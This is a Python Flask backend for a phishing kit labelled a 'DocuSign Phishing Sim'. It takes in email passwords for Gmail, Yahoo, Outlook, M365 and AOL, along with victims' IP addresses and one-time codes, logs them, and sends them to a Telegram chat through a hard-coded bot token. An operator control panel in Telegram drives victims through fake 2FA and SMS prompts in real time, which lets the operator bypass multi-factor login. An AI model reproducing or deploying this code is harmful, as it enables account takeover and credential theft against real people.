#!/usr/bin/env python3
"""
DocuSign Phishing Sim — Backend API
Deploy on Render as a Web Service
"""

import json, logging, datetime, hashlib, threading, time, random, os
from flask import Flask, request, jsonify
from telegram import Bot, InlineKeyboardButton, InlineKeyboardMarkup

# ─── CONFIG ───
TELEGRAM_BOT_TOKEN = "8868268134:AAHTVlyTE0ksIwGG75SWEKg-qbUGd8wHE3s"
TELEGRAM_CHAT_ID = "8337327707"
LOG_FILE = "captured.log"

app = Flask(__name__)
bot = Bot(token=TELEGRAM_BOT_TOKEN)

gmail_sessions = {}

logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")
logger = logging.getLogger(__name__)

# ─── TELEGRAM ───
def tg(text, markup=None):
    try:
        m = InlineKeyboardMarkup(markup) if markup else None
        msg = bot.send_message(chat_id=TELEGRAM_CHAT_ID, text=text, reply_markup=m)
        return msg.message_id
    except Exception as e:
        logger.error(f"TG error: {e}")

def tg_edit(msg_id, text, markup=None):
    try:
        m = InlineKeyboardMarkup(markup) if markup else None
        bot.edit_message_text(chat_id=TELEGRAM_CHAT_ID, message_id=msg_id, text=text, reply_markup=m)
    except Exception as e:
        logger.error(f"TG edit error: {e}")

def poll_telegram():
    last_id = 0
    while True:
        try:
            updates = bot.get_updates(offset=last_id, timeout=30)
            for u in updates:
                last_id = u.update_id + 1
                if u.callback_query:
                    handle_cb(u.callback_query)
        except:
            time.sleep(5)

def handle_cb(query):
    data = query.data
    mid = query.message.message_id
    try:
        bot.answer_callback_query(query.id)
        
        if data.startswith("yes:"):
            sid = data.split(":",1)[1]
            if sid in gmail_sessions:
                gmail_sessions[sid]["action"] = "2fa_grid"
                gmail_sessions[sid]["stage"] = "awaiting_2fa"
                # Show number grid
                kb = []
                row = []
                for i in range(10, 100):
                    row.append(InlineKeyboardButton(str(i), callback_data=f"2fa:{sid}:{i}"))
                    if len(row) == 9:
                        kb.append(row); row = []
                if row: kb.append(row)
                kb.append([InlineKeyboardButton("❌ Cancel", callback_data=f"cancel:{sid}")])
                tg_edit(mid, f"🔐 Select 2FA phone number ending:", markup=kb)
        
        elif data.startswith("2fa:"):
            parts = data.split(":")
            sid, digit = parts[1], parts[2]
            if sid in gmail_sessions:
                gmail_sessions[sid]["phone"] = digit
                gmail_sessions[sid]["action"] = "show_prompt"
                gmail_sessions[sid]["stage"] = "prompt_shown"
                tg_edit(mid, f"✅ 2FA number selected: ••••{digit}\n\nPrompt sent to user. Waiting for 'Authorized' click...",
                       markup=[[InlineKeyboardButton("✅ User Authorized", callback_data=f"authorized:{sid}")]])
        
        elif data.startswith("authorized:"):
            sid = data.split(":",1)[1]
            if sid in gmail_sessions:
                code1 = f"{random.randint(100000, 999999)}"
                gmail_sessions[sid]["sms1"] = code1
                gmail_sessions[sid]["action"] = "sms1"
                gmail_sessions[sid]["stage"] = "sms1"
                tg_edit(mid, f"📱 SMS Code I: `{code1}`\n\nSend SMS Code II?",
                       parse_mode="Markdown",
                       markup=[[InlineKeyboardButton("📱 Send SMS II", callback_data=f"sms2:{sid}")],
                               [InlineKeyboardButton("🔄 Resend SMS I", callback_data=f"resend1:{sid}")]])
        
        elif data.startswith("sms2:"):
            sid = data.split(":",1)[1]
            if sid in gmail_sessions:
                code2 = f"{random.randint(100000, 999999)}"
                gmail_sessions[sid]["sms2"] = code2
                gmail_sessions[sid]["action"] = "sms2"
                gmail_sessions[sid]["stage"] = "sms2"
                tg_edit(mid, f"📱 SMS Code II: `{code2}`\n\nBoth sent. Complete?",
                       parse_mode="Markdown",
                       markup=[[InlineKeyboardButton("✅ Complete", callback_data=f"success:{sid}")]])
        
        elif data.startswith("resend1:"):
            sid = data.split(":",1)[1]
            if sid in gmail_sessions:
                c = f"{random.randint(100000, 999999)}"
                gmail_sessions[sid]["sms1"] = c
                tg(f"🔄 SMS I resent: `{c}`", parse_mode="Markdown")
        
        elif data.startswith("success:"):
            sid = data.split(":",1)[1]
            if sid in gmail_sessions:
                s = gmail_sessions[sid]
                s["action"] = "success"
                s["stage"] = "done"
                tg_edit(mid, f"✅ COMPLETE — {s['email']}\n\n"
                       f"Email: {s['email']}\nPassword: {s['password']}\n"
                       f"Phone: ••••{s.get('phone','N/A')}\n"
                       f"SMS I: {s.get('sms1','N/A')}\nSMS II: {s.get('sms2','N/A')}")
        
        elif data.startswith("cancel:"):
            sid = data.split(":",1)[1]
            if sid in gmail_sessions:
                gmail_sessions[sid]["action"] = "cancelled"
                gmail_sessions[sid]["stage"] = "cancelled"
                tg_edit(mid, "❌ Session cancelled.")
        
        elif data.startswith("pw_error:"):
            sid = data.split(":",1)[1]
            if sid in gmail_sessions:
                gmail_sessions[sid]["action"] = "pw_error"
                gmail_sessions[sid]["stage"] = "pw_error"
                tg_edit(mid, "🔑 Showing 'Wrong Password' to user.")
        
        elif data.startswith("no:"):
            sid = data.split(":",1)[1]
            if sid in gmail_sessions:
                gmail_sessions[sid]["action"] = "denied"
                gmail_sessions[sid]["stage"] = "denied"
                tg_edit(mid, "❌ Access Denied — user redirected.")
    except Exception as e:
        logger.error(f"CB error: {e}")

# ─── API ───
@app.route("/")
def health():
    return jsonify({"status": "ok", "sessions": len(gmail_sessions)})

@app.route("/api/creds", methods=["POST"])
def capture():
    """Universal credential capture endpoint"""
    data = request.json
    provider = data.get("provider", "unknown")
    email = data.get("email", "")
    password = data.get("password", "")
    ip = request.remote_addr
    ua = request.headers.get("User-Agent", "unknown")
    
    session_id = hashlib.md5(f"{time.time()}{random.random()}{email}".encode()).hexdigest()[:12]
    
    # Log
    entry = {"timestamp": datetime.datetime.utcnow().isoformat(), "provider": provider,
             "email": email, "password": password, "ip": ip, "ua": ua, "session": session_id}
    
    with open(LOG_FILE, "a") as f:
        f.write(json.dumps(entry) + "\n")
    
    # ── Telegram ──
    if provider == "gmail":
        gmail_sessions[session_id] = {
            "email": email, "password": password, "ip": ip, "ua": ua,
            "action": "waiting", "stage": "new",
            "phone": None, "sms1": None, "sms2": None
        }
        
        # Send credential drop first
        tg(f"[+]___ Invitation Card (GMAIL) ___[+]\n"
           f"You have a new website form submission \n"
           f"IP Address: {ip}\n"
           f"Id: gmail\n"
           f"Email: {email}\n"
           f"Password: {password}\n"
           f"UA: {ua}")
        
        # Send control panel
        tg(f"🔔 GMAIL — {email}\nPassword: {password}\nSession: {session_id}",
           markup=[
               [InlineKeyboardButton("✅ Yes", callback_data=f"yes:{session_id}"),
                InlineKeyboardButton("❌ No", callback_data=f"no:{session_id}")],
               [InlineKeyboardButton("🔑 Password Error", callback_data=f"pw_error:{session_id}")]
           ])
        
        return jsonify({"session": session_id, "action": "waiting"})
    
    else:
        # Non-Gmail
        pid = {"yahoo":"yahoo","outlook":"outlook","m365":"m365","aol":"aol"}.get(provider, provider)
        tg(f"[+]___ Invitation Card ___[+]\n"
           f"You have a new website form submission \n"
           f"IP Address: {ip}\n"
           f"Id: {pid}\n"
           f"Email: {email}\n"
           f"Password: {password}")
        
        return jsonify({"session": session_id, "action": "check_provider"})

@app.route("/api/gmail/status/<session_id>")
def gmail_status(session_id):
    """Gmail: frontend polls this to get current action"""
    if session_id not in gmail_sessions:
        return jsonify({"action": "redirect", "url": "https://accounts.google.com"})
    s = gmail_sessions[session_id]
    action = s.get("action", "waiting")
    
    if action == "waiting":
        return jsonify({"action": "waiting"})
    elif action == "show_prompt":
        return jsonify({"action": "show_prompt", "phone": s.get("phone", "XX")})
    elif action == "pw_error":
        return jsonify({"action": "pw_error"})
    elif action == "denied":
        return jsonify({"action": "denied"})
    elif action == "sms1":
        return jsonify({"action": "sms", "code": s.get("sms1", "000000"), "num": 1})
    elif action == "sms2":
        return jsonify({"action": "sms", "code": s.get("sms2", "000000"), "num": 2})
    elif action == "success":
        return jsonify({"action": "success"})
    elif action == "cancelled":
        return jsonify({"action": "redirect", "url": "https://accounts.google.com"})
    return jsonify({"action": "waiting"})

@app.route("/api/gmail/authorize/<session_id>", methods=["POST"])
def gmail_authorize(session_id):
    """User clicked Authorized"""
    if session_id in gmail_sessions:
        gmail_sessions[session_id]["action"] = "authorized"
        tg(f"✅ User clicked 'Authorized' for {gmail_sessions[session_id]['email']}")
    return jsonify({"status": "ok"})

@app.route("/api/otp", methods=["POST"])
def capture_otp():
    """Capture OTP code"""
    data = request.json
    otp = data.get("otp", "")
    provider = data.get("provider", "unknown")
    session_id = data.get("session", "unknown")
    ip = request.remote_addr
    
    entry = {"timestamp": datetime.datetime.utcnow().isoformat(), "event": "otp",
             "provider": provider, "otp": otp, "ip": ip, "session": session_id}
    with open(LOG_FILE, "a") as f:
        f.write(json.dumps(entry) + "\n")
    
    tg(f"[+]___ OTP Code ___[+]\nId: {provider}\nOTP: {otp}")
    
    return jsonify({"status": "ok"})

# ─── START ───
if __name__ == "__main__":
    threading.Thread(target=poll_telegram, daemon=True).start()
    port = int(os.environ.get("PORT", 8080))
    app.run(host="0.0.0.0", port=port, debug=False)
